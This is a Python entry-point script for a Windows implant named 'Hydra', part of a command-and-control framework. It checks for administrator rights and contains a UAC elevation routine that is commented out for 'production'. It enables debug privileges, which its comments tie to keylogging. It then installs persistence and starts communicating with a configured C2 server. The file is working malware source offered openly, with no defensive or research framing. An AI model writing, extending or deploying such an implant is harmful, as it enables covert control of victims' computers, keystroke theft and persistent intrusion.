import os
import sys
import asyncio
import ctypes
import traceback

# Add package root to Python path
package_root = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
if package_root not in sys.path:
    sys.path.insert(0, package_root)

from hydra_client.network import C2Communication
from hydra_client.implant import HydraImplant
from hydra_client.config import SERVER_URL, PSK

def is_admin():
    """Check if the script is running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    """Try to elevate privileges if not admin"""
    if not is_admin():
        print("[+] Attempting to elevate privileges...")
        try:
            # Re-run the program with admin rights
            ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable, 
                " ".join(sys.argv), 
                None, 
                1
            )
            # Exit the current non-elevated process
            sys.exit(0)
        except Exception as e:
            print(f"[-] Failed to elevate privileges: {e}")
            # Continue without admin privileges
            return False
    return True

async def main():
    print("[*] Starting Hydra implant...")
    print(f"[*] Python version: {sys.version}")
    print(f"[*] Running as admin: {is_admin()}")
    
    # Try to enable debug privileges for keylogging
    try:
        import win32security
        import win32api
        import ntsecuritycon
        
        # Get the current process token
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        )
        
        # Enable debug privilege
        privilege_id = win32security.LookupPrivilegeValue(
            None, 
            ntsecuritycon.SE_DEBUG_NAME
        )
        
        win32security.AdjustTokenPrivileges(
            hToken, 
            0, 
            [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
        )
        
        print("[+] Debug privileges enabled")
    except Exception as e:
        print(f"[-] Failed to enable debug privileges: {e}")
    
    # Initialize C2 communication
    c2 = C2Communication(SERVER_URL, PSK)
    
    # Initialize implant
    implant = HydraImplant()
    
    try:
        # Install persistence
        if implant.install_persistence():
            print("[+] Persistence installed successfully")
        else:
            print("[-] Failed to install persistence")
        
        # Start C2 communication
        print("[+] Starting C2 communication...")
        await c2.run()
                
    except KeyboardInterrupt:
        print("[*] Shutting down...")
        await c2.stop()
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        traceback.print_exc()
        await c2.stop()
        sys.exit(1)

def run_main():
    """Entry point for the application."""
    # Set up asyncio policy for Windows
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    # Try to elevate privileges if needed for advanced features
    if not is_admin():
        print("[!] Warning: Not running with admin privileges. Some features may not work.")
        print("[!] For full functionality (especially keylogging), run as administrator.")
        # Uncomment the following line to auto-elevate in production
        # elevate_privileges()
    
    # Run main loop
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    run_main() 